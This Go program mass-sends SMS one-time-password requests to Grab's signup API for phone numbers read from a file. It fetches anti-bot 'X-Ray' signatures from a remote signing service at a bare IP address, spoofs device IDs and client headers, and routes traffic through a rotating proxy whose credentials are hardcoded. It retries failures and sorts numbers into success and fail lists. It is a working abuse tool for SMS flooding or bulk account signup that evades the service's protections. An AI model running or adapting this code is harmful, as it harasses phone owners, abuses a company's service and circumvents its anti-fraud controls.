package main

import (
	"bufio"
	"bytes"
	"crypto/sha256"
	"encoding/hex"
	"encoding/json"
	"fmt"
	"io/ioutil"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"time"

	"concurrentrix/config"
	"concurrentrix/record"
)

var (
	SuccessPhones = make(chan string, config.ChanNum)
	FailPhones    = make(chan string, config.ChanNum)
	AgainPhones   = make(chan *AgainSendPool, config.ChanNum)
	MutexSendJobs sync.Mutex
	MutexUseJobs  sync.Mutex
	MutexAgainNum sync.Mutex
	SendJobs      = 0
	AgainNum      = 0
)

func main() {
	phones, err := readPhone()
	if err != nil {
		fmt.Print(err.Error())
		return
	}

	useJobs := new(int)
	*useJobs = len(phones)

	go record.WriteSuccessPhone(SuccessPhones, &MutexUseJobs, useJobs)
	go record.WriteFailPhone(FailPhones, &MutexUseJobs, useJobs)

	phoneJobs := make(chan string)

	for i := 0; i < config.Work; i++ {
		threadSend(phoneJobs)
		againSend()
	}

	for _, phone := range phones {
		phoneJobs <- phone
	}

	for {
		if SendJobs == len(phones) && *useJobs == 0 && AgainNum == 0 {
			close(SuccessPhones)
			close(FailPhones)
			close(AgainPhones)
			os.Exit(1)
		}
	}
}

func threadSend(jobs chan string) {
	go func() {
		for {
			phone := <-jobs
			xRay, err := getXRay(getPhoneSha256(phone))
			if err != nil {
				fmt.Print(err.Error())
				return
			}
			fmt.Printf("============ 开始发送 phone{%v}=============\n", phone)
			err = smsSend(phone, xRay)
			if err != nil {
				if config.Again == 0 {
					FailPhones <- phone
				} else {
					AgainPhones <- &AgainSendPool{
						phone:     phone,
						Frequency: 0,
					}
					MutexAgainNum.Lock()
					AgainNum++
					MutexAgainNum.Unlock()
				}
				fmt.Printf("%v\n", err)
			}
			MutexSendJobs.Lock()
			SendJobs++
			MutexSendJobs.Unlock()
			time.Sleep(5 * time.Millisecond)
		}
	}()
}

type AgainSendPool struct {
	phone     string
	Frequency int
}

func againSend() {
	go func() {
		for {
			fmt.Printf("AgainNum=================%d\n", AgainNum)
			agPh := <-AgainPhones
			MutexAgainNum.Lock()
			AgainNum--
			MutexAgainNum.Unlock()
			xRay, err := getXRay(getPhoneSha256(agPh.phone))
			if err != nil {
				fmt.Print(err.Error())
				return
			}
			if agPh.Frequency == config.Again {
				FailPhones <- agPh.phone
			} else {
				fmt.Printf("============ {%d} 重复发送 phone{%v}=============\n", agPh.Frequency, agPh.phone)
				err = smsSend(agPh.phone, xRay)
				if err != nil {
					fmt.Printf("%v\n", err)
					AgainPhones <- &AgainSendPool{
						phone:     agPh.phone,
						Frequency: agPh.Frequency + 1,
					}
					MutexAgainNum.Lock()
					AgainNum++
					MutexAgainNum.Unlock()
				}
			}
		}
	}()
}

func readPhone() (phones []string, err error) {
	file, err := os.Open("used_nuber.txt")
	if err != nil {
		err = fmt.Errorf(err.Error())
		return
	}
	defer file.Close()

	// 使用 bufio 包创建一个 Scanner
	scanner := bufio.NewScanner(file)

	// 逐行读取文件内容
	for scanner.Scan() {
		line := scanner.Text()
		// 处理前后空格
		trimmedLine := strings.TrimSpace(line)
		phones = append(phones, trimmedLine)
	}

	// 检查是否发生了扫描错误
	err = scanner.Err()
	if err != nil {
		err = fmt.Errorf("扫描文件时发生错误:", err)
		return
	}
	return
}

// 编码为 Base64
func getPhoneSha256(strToHash string) string {
	// 第一次 SHA-256 哈希
	sha256Hash := sha256.New()
	sha256Hash.Write([]byte(strToHash))
	hashedStr := sha256Hash.Sum(nil)
	hashedStrHex := hex.EncodeToString(hashedStr)

	// 第二次 SHA-256 哈希
	sha256Hash = sha256.New()
	sha256Hash.Write([]byte(hashedStrHex))
	digest := sha256Hash.Sum(nil)
	hexDigest := hex.EncodeToString(digest)

	return hexDigest
}

// 获取Authorization
func getPhoneSha256s(strToHash string) string {
	sha256Hash := sha256.New()
	sha256Hash.Write([]byte(strToHash))
	hashedStr := sha256Hash.Sum(nil)
	hashedStrHex := hex.EncodeToString(hashedStr)
	return hashedStrHex
}

var smsSendUrl = "https://api.grab.com/grabid/v1/phone/otp"
var getXRayUrl = "http://154.221.17.198:5612/business/invoke?group=huoyu_test&action=nb&arg1="
var tunnel = "i635.kdltps.com:15818"
var username = "t10407739755674"
var password = "op1un18b"

type xRayStr struct {
	ClientID string
	Data     string
	Message  interface{}
}

func getXRay(enco string) (string, error) {
	resp, err := http.Get(getXRayUrl + enco)
	if err != nil {
		err = fmt.Errorf("http get err: %v", err)
		return "", err
	}
	defer resp.Body.Close()

	// 读取响应体
	var result *xRayStr
	decoder := json.NewDecoder(resp.Body)
	err = decoder.Decode(&result)
	if err != nil {
		err = fmt.Errorf("decode err: %v", err)
		return "", err
	}

	return result.Data, nil
}

func generateRandomDriverID() string {
	// 设置随机数种子
	rand.Seed(time.Now().UnixNano())

	// 生成1000到9999之间的随机数
	randomNumber := rand.Intn(9000) + 1000

	// 生成带有固定后缀的driver_id
	driverID := fmt.Sprintf("%d%s", randomNumber, "c6509c1db2d1")

	return driverID
}

func smsSend(phone, xRay string) error {
	// 构建请求头
	headers := map[string]string{
		"Connection":           "close",
		"X-Ray":                xRay,
		"X-Grab-Device-ID":     generateRandomDriverID(),
		"alias_sessionid":      "2312271214-0yu1VjiyG9gadd" + xRay,
		"x-request-id":         fmt.Sprintf("%s", time.Now().UnixNano()),
		"X-Grab-Device-Model":  "Pixel 4 XL",
		"Authorization":        "grabsecure " + getPhoneSha256s(phone),
		"Accept-Language":      "zh-CN;q=1.0, en-US;q=0.9, en;q=0.8",
		"X-Translate-Language": "",
		"User-Agent":           "Grab/5.285.0 (Android 10; Build 62826273)",
		"Content-Type":         "application/json; charset=UTF-8",
		"Host":                 "api.grab.com",
		"accept-encoding":      "gzip",
	}

	// 构建请求体
	payload := map[string]interface{}{
		"method":                  "SMS",
		"countryCode":             "cn",
		"phoneNumber":             phone,
		"templateID":              "pax_android_production",
		"numDigits":               6,
		"deviceID":                generateRandomDriverID(),
		"deviceManufacturer":      "Google",
		"deviceModel":             "Pixel 4 XL",
		"cellularOperator":        "",
		"locale":                  "en-KW",
		"retryCount":              0,
		"eligibleForAccountHints": "false",
		"adrID":                   nil,
		"adrIMEI":                 nil,
		"adrIMSI":                 nil,
		"adrMEID":                 nil,
		"adrSERIAL":               nil,
		"adrUDID":                 nil,
		"advertisingID":           nil,
		"scenario":                "signup",
	}

	// 将请求体转为JSON格式
	jsonPayload, err := json.Marshal(payload)
	if err != nil {
		err = fmt.Errorf("JSON编码错误:%v", err)
		return err
	}

	// 发送POST请求
	req, err := http.NewRequest("POST", smsSendUrl, bytes.NewBuffer(jsonPayload))
	if err != nil {
		err = fmt.Errorf("创建请求错误:%v", err)
		return err
	}

	// 设置请求头
	for key, value := range headers {
		req.Header.Set(key, value)
	}

	// 设置代理
	proxyURL := fmt.Sprintf("http://%s:%s@%s/", username, password, tunnel)
	parsedProxyURL, err := url.Parse(proxyURL)
	if err != nil {
		err = fmt.Errorf("解析代理URL错误: %v", err)
		return err
	}
	transport := &http.Transport{Proxy: http.ProxyURL(parsedProxyURL)}
	client := &http.Client{Transport: transport}

	// 发送请求
	response, err := client.Do(req)
	if err != nil {
		err = fmt.Errorf("发送请求错误: %v", err)
		return err
	}
	defer response.Body.Close()

	// 读取响应体
	body, _ := ioutil.ReadAll(response.Body)
	if err != nil {
		err = fmt.Errorf("读取响应体错误: %v", err)
		return err
	}

	// 打印响应结果
	fmt.Printf("响应结果: %s\n", body)
	if response.StatusCode == http.StatusOK {
		if bytes.Contains(body, []byte("challengeID")) {
			SuccessPhones <- phone
			fmt.Printf("号码:%s send success\n", phone)
		} else {
			ap := &AgainSendPool{
				phone: phone,
			}
			ap.Frequency++
			AgainPhones <- ap
			MutexAgainNum.Lock()
			AgainNum++
			MutexAgainNum.Unlock()
			fmt.Printf("号码:%s send error。%s\n", phone, body)
		}
	} else {
		err = fmt.Errorf("号码:%s send error。Status Code: %d\n", phone, response.StatusCode)
	}
	return err
}
